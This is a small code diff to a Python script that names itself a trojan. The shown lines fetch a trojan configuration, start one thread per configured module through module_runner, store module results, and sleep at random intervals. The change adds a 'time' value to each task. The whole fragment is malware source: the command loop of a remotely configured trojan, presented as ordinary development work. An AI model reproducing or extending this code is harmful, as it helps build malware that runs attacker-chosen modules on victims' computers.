@@ -100,7 +100,7 @@ def store_module_result(data):
 
     return
 
-def module_runner(module):
+def module_runner(module, time):
 
     task_queue.put(1)
     result = sys.modules[module].run()
@@ -122,7 +122,7 @@ while True:
         config = get_trojan_config()
         
         for task in config:
-            t = threading.Thread(target=module_runner,args=(task['module'],))
+            t = threading.Thread(target=module_runner,args=(task['module'],task['time'],))
             t.start()
             time.sleep(random.randint(1,2))
             
